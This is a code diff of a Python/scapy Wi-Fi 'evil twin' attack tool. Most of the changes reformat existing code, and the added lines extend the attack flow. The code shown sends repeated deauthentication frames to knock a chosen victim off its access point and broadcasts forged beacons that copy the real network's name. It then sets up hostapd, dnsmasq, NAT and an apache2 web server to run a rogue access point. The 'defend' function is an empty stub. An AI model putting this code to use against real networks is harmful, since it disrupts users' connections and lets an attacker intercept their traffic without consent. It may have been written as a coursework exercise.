@@ -62,15 +62,14 @@ def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
     # First layer being a 802.11 layer with our input info for the attack
     # Second Layer being the de-authentication DoS step: reason=1 -> unspecified reason
     victim_packet = RadioTap() \
-                    /Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr) \
-                    /Dot11Deauth(reason=1)
+                    / Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr) \
+                    / Dot11Deauth(reason=1)
     ap_packet = RadioTap() \
-               /Dot11(addr1=ap_mac_addr, addr2=victim_mac_addr, addr3=ap_mac_addr) \
-               /Dot11Deauth(reason=1)
+                / Dot11(addr1=ap_mac_addr, addr2=victim_mac_addr, addr3=ap_mac_addr) \
+                / Dot11Deauth(reason=1)
     # Send 100 packets for each, with a 0.1 interval between each packet to ensure proper de-authentication
     sendp(victim_packet, inter=0.1, count=100, iface=iface, verbose=1)
     sendp(ap_packet, inter=0.1, count=100, iface=iface, verbose=1)
-
 
 
 def scan_captured_networks(ap_list, flag):
@@ -119,15 +118,15 @@ def choose_user_to_attack(user_list):
 def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
     # type=0:       management frame
     # subtype=8:    beacon frame
-	dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
-	beacon = Dot11Beacon()  # init the beacon frame
-	essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))  # inject the ssid name
-	frame = RadioTap() / dot11 / beacon / essid	# add a RadioTap and stack all the layers
-	# send the frame
-	if infinite:
-		sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
-	else:
-		sendp(frame, iface=iface, verbose=0)
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+    beacon = Dot11Beacon()  # init the beacon frame
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))  # inject the ssid name
+    frame = RadioTap() / dot11 / beacon / essid  # add a RadioTap and stack all the layers
+    # send the frame
+    if infinite:
+        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
+    else:
+        sendp(frame, iface=iface, verbose=0)
 
 
 def create_fake_ap(iface, victim, ap_name):
@@ -138,7 +137,7 @@ def create_fake_ap(iface, victim, ap_name):
 
 
 def network_attack(iface):
-    global interface_name, ap_list, users, victim
+    global interface_name, ap_list, users
     interface_name = iface
     change_modes.init_attack_mode()
     change_modes.active_monitor_mode(iface)
@@ -147,13 +146,29 @@ def network_attack(iface):
     chosen_ap = scan_captured_networks(ap_list, flag=False)
 
     # Found Access Points
-    if chosen_ap != -1:
-        scan_for_users(iface, channel_range=10, timeout=10)
-        victim = choose_user_to_attack(users)
+    if chosen_ap == -1:
+        action = int(input("Couldn't find any AP's in your area, what would you like to do?\n"
+                           "1- Try again\n2- Exit"))
+        if action == 1:
+            network_attack(iface)
+        else:
+            sys.exit(1)
+
+    scan_for_users(iface, channel_range=10, timeout=10)
+    victim = choose_user_to_attack(users)
 
     deauthenticate_victim(iface, victim, chosen_ap_mac)
     create_fake_ap(iface, victim, ap_name=chosen_ap[1])
 
+    helper.create_hostapd_file(iface, chosen_ap[1])
+    helper.create_dnsmasq_file(iface)
+    os.system(f"sudo iwconfig {iface} channel {chosen_ap[2]}")
+    helper.enable_nat()
+    os.system("sudo service apache2 restart")
+    helper.start_ap()
 
-def defense_attack():
+
+def defend_from_attack():
     pass
+    # Once we recognize an attack, this next line will block all connections from the input IP address
+    # os.system(f"iptables -A INPUT -s {attacker_ip} -j DROP")
